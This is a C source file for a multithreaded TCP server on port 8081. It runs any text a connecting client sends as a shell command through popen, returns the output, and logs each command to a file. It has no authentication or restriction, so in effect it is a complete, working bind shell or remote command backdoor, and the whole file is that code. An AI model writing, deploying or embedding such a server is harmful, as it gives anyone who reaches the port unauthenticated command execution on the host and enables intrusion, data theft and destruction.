#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define PORT 8081
#define MAX_COMMAND_SIZE 1024
#define LOG_FILE "commands.log"

// Function Prototypes
void *handle_client(void *arg);
void log_command(const char *command, const char *output);
void cleanup();
void signal_handler(int sig);

// Global Variables
int server_fd = -1;

// Signal handler
void signal_handler(int sig) {
    fprintf(stderr, "Caught signal %d, cleaning up\n", sig);
    cleanup();
    exit(1);
}

// Cleanup resources
void cleanup() {
    if (server_fd >= 0) {
        close(server_fd);
        fprintf(stderr, "Closed server socket\n");
    }
}

// Log command and output
void log_command(const char *command, const char *output) {
    FILE *log = fopen(LOG_FILE, "a");
    if (log) {
        fprintf(log, "Command: %s\nOutput: %s\n\n", command, output);
        fclose(log);
    } else {
        fprintf(stderr, "Failed to open %s: %s\n", LOG_FILE, strerror(errno));
    }
}

// Handle client connection (persistent)
void *handle_client(void *arg) {
    int client_socket = *(int *)arg;
    free(arg); // Free allocated memory for socket

    char buffer[MAX_COMMAND_SIZE];
    while (1) {
        ssize_t len = recv(client_socket, buffer, MAX_COMMAND_SIZE - 1, 0);
        if (len <= 0) {
            if (len == 0) {
                fprintf(stderr, "Client disconnected\n");
            } else {
                fprintf(stderr, "Receive failed: %s\n", strerror(errno));
            }
            break;
        }
        buffer[len] = '\0';
        buffer[strcspn(buffer, "\n")] = '\0'; // Remove newline

        if (strlen(buffer) == 0) {
            continue;
        }

        fprintf(stderr, "Received command: %s\n", buffer);

        FILE *pipe = popen(buffer, "r");
        if (!pipe) {
            fprintf(stderr, "Failed to execute command: %s\n", buffer);
            const char *error = "Command execution failed\n";
            send(client_socket, error, strlen(error), 0);
            continue;
        }

        char output[MAX_COMMAND_SIZE * 10] = {0};
        size_t output_len = 0;
        while (fgets(output + output_len, sizeof(output) - output_len, pipe)) {
            output_len = strlen(output);
        }
        pclose(pipe);

        // Ensure output ends with newline
        if (output_len > 0 && output[output_len - 1] != '\n') {
            output[output_len++] = '\n';
            output[output_len] = '\0';
        }

        log_command(buffer, output);
        if (send(client_socket, output, output_len, 0) < 0) {
            fprintf(stderr, "Failed to send output: %s\n", strerror(errno));
            break;
        }
    }

    close(client_socket);
    fprintf(stderr, "Closed client socket %d\n", client_socket);
    return NULL;
}

int main() {
    signal(SIGSEGV, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN);

    // Create socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Set SO_REUSEADDR
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("Failed to set SO_REUSEADDR");
        close(server_fd);
        return 1;
    }

    // Bind socket
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        close(server_fd);
        return 1;
    }

    // Listen
    if (listen(server_fd, 10) < 0) {
        perror("Listen failed");
        close(server_fd);
        return 1;
    }

    printf("Server listening on port %d...\n", PORT);

    // Accept clients
    while (1) {
        int *client_socket = malloc(sizeof(int));
        if (!client_socket) {
            perror("Malloc failed");
            continue;
        }

        *client_socket = accept(server_fd, NULL, NULL);
        if (*client_socket < 0) {
            perror("Accept failed");
            free(client_socket);
            continue;
        }

        fprintf(stderr, "Accepted client socket %d\n", *client_socket);

        pthread_t tid;
        if (pthread_create(&tid, NULL, handle_client, client_socket) != 0) {
            perror("Thread creation failed");
            close(*client_socket);
            free(client_socket);
            continue;
        }
        pthread_detach(tid);
    }

    cleanup();
    return 0;
}